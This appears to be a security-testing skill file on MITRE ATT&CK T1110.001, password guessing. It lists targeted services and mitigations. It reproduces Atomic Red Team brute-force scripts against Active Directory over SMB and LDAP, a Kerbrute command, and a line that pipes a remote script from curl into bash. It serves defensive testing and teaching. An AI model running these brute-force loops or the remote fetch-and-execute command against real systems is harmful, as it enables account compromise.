---
name: "T1110.001_password-guessing"
description: "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts."
category: "authentication"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1110.001
  - credential-access
  - windows
  - saas
  - iaas
  - linux
  - macos
  - containers
  - network-devices
  - office-suite
  - identity-provider
  - esxi
  - sub-technique
technique_id: "T1110.001"
tactic: "credential-access"
all_tactics:
  - credential-access
platforms:
  - Windows
  - SaaS
  - IaaS
  - Linux
  - macOS
  - Containers
  - Network Devices
  - Office Suite
  - Identity Provider
  - ESXi
mitre_url: "https://attack.mitre.org/techniques/T1110/001"
tech_stack:
  - windows
  - saas
  - cloud
  - linux
  - macos
  - containers
  - network devices
  - office
  - identity
  - esxi
cwe_ids:
  - CWE-522
chains_with:
  - T1110
  - T1110.002
  - T1110.003
  - T1110.004
prerequisites:
  - T1110
severity_boost:
  T1110: "Chain with T1110 for deeper attack path"
  T1110.002: "Chain with T1110.002 for deeper attack path"
  T1110.003: "Chain with T1110.003 for deeper attack path"
---

# T1110.001 Password Guessing

> **Sub-technique of:** T1110

## High-Level Description

Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.

Guessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies.

Typically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:

- SSH (22/TCP)
- Telnet (23/TCP)
- FTP (21/TCP)
- NetBIOS / SMB / Samba (139/TCP & 445/TCP)
- LDAP (389/TCP)
- Kerberos (88/TCP)
- RDP / Terminal Services (3389/TCP)
- HTTP/HTTP Management Services (80/TCP & 443/TCP)
- MSSQL (1433/TCP)
- Oracle (1521/TCP)
- MySQL (3306/TCP)
- VNC (5900/TCP)
- SNMP (161/UDP and 162/TCP/UDP)

In addition to management services, adversaries may "target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols," as well as externally facing email applications, such as Office 365.. Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.

In default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows "logon failure" event ID 4625.

## Kill Chain Phase

- Credential Access (TA0006)

**Platforms:** Windows, SaaS, IaaS, Linux, macOS, Containers, Network Devices, Office Suite, Identity Provider, ESXi

## What to Check

- [ ] Identify if Password Guessing technique is applicable to target environment
- [ ] Check Windows systems for indicators of Password Guessing
- [ ] Check SaaS systems for indicators of Password Guessing
- [ ] Check IaaS systems for indicators of Password Guessing
- [ ] Verify mitigations are bypassed or absent (4 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Brute Force Credentials of single Active Directory domain users via SMB

Attempts to brute force a single Active Directory account by testing connectivity to the IPC$ share on a domain controller

**Supported Platforms:** windows

```cmd
echo Password1> passwords.txt
echo 1q2w3e4r>> passwords.txt
echo Password!>> passwords.txt
echo Spring2022>> passwords.txt
echo ChangeMe!>> passwords.txt
@FOR /F "delims=" %p in (passwords.txt) DO @net use %logonserver%\IPC$ /user:"%userdomain%\#{user}" "%p" 1>NUL 2>&1 && @echo [*] #{user}:%p && @net use /delete %logonserver%\IPC$ > NUL
```

### Atomic Test 2: Brute Force Credentials of single Active Directory domain user via LDAP against domain controller (NTLM or Kerberos)

Attempt to brute force Active Directory domain user on a domain controller, via LDAP, with NTLM or Kerberos

**Supported Platforms:** windows

```powershell
if ("#{auth}".ToLower() -NotIn @("ntlm","kerberos")) {
  Write-Host "Only 'NTLM' and 'Kerberos' auth methods are supported"
  exit 1
}

[System.Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") | Out-Null
$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier("#{domain}",389)

$passwordList = Get-Content -Path "#{passwords_path}"
foreach ($password in $passwordList){
  $credz = new-object System.Net.NetworkCredential("#{user}", $password, "#{domain}")
  $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::#{auth})
  try {
    Write-Host " [-] Attempting ${password} on account #{user}."
    $conn.bind()
    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
    Write-Host " [!] #{user}:${password} are valid credentials!"
  } catch {
    Write-Host $_.Exception.Message
  }
}
Write-Host "End of bruteforce"
```

### Atomic Test 4: Password Brute User using Kerbrute Tool

Bruteforce a single user's password from a wordlist

**Supported Platforms:** windows

```powershell
cd "PathToAtomicsFolder\..\ExternalPayloads"
.\kerbrute.exe bruteuser --dc #{domaincontroller} -d #{domain} $env:temp\bruteuser.txt TestUser1
```

**Dependencies:**

- kerbrute.exe must exist in PathToAtomicsFolder\..\ExternalPayloads
- bruteuser.txt must exist in PathToAtomicsFolder\..\ExternalPayloads

### Atomic Test 5: SUDO Brute Force - Debian

An adversary may find themselves on a box (e.g. via ssh key auth, with no password) with a user that has sudo'ers privileges, but they do not know the users password. Normally, failed attempts to access root will not cause the root account to become locked, to prevent denial-of-service. This functionality enables an attacker to undertake a local brute force password guessing attack without locking out the root user.

This test creates the "art" user with a password of "password123", logs in, downloads and executes the sudo_bruteforce.sh which brute force guesses the password, then deletes the user

**Supported Platforms:** linux
**Elevation Required:** Yes

```bash
useradd -G sudo -s /bin/bash -p $(openssl passwd -1 password123) art
su -c "cd /tmp; curl -s #{remote_url} | bash" art
```

**Dependencies:**

- Check if running on a Debian based machine.

### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Password Guessing by examining the target platforms (Windows, SaaS, IaaS).

2. **Assess Existing Defenses**: Review whether mitigations for T1110.001 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1051 Update Software

Upgrade management services to the latest supported and compatible version. Specifically, any version providing increased password complexity or policy enforcement preventing default or weak passwords.

### M1032 Multi-factor Authentication

Use multi-factor authentication. Where possible, also enable multi-factor authentication on externally facing services.

### M1027 Password Policies

Refer to NIST guidelines when creating password policies.

### M1036 Account Use Policies

Set account lockout policies after a certain number of failed login attempts to prevent passwords from being guessed. Too strict a policy may create a denial of service condition and render environments un-usable, with all accounts used in the brute force being locked-out. Use conditional access policies to block logins from non-compliant devices or from outside defined organization IP ranges. Consider blocking risky authentication requests, such as those originating from anonymizing services/proxies.

## Detection

### Password Guessing via Multi-Source Authentication Failure Correlation

## Risk Assessment

| Finding                                | Severity | Impact            |
| -------------------------------------- | -------- | ----------------- |
| Password Guessing technique applicable | High     | Credential Access |

## CWE Categories

| CWE ID  | Title                                |
| ------- | ------------------------------------ |
| CWE-522 | Insufficiently Protected Credentials |

## References

- [Trend Micro Emotet 2020](https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/emotet-now-spreads-via-wi-fi)
- [Cylance Cleaver](https://web.archive.org/web/20200302085133/https://www.cylance.com/content/dam/cylance/pages/operation-cleaver/Cylance_Operation_Cleaver_Report.pdf)
- [US-CERT TA18-068A 2018](https://www.us-cert.gov/ncas/alerts/TA18-086A)
- [Atomic Red Team - T1110.001](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1110.001)
- [MITRE ATT&CK - T1110.001](https://attack.mitre.org/techniques/T1110/001)
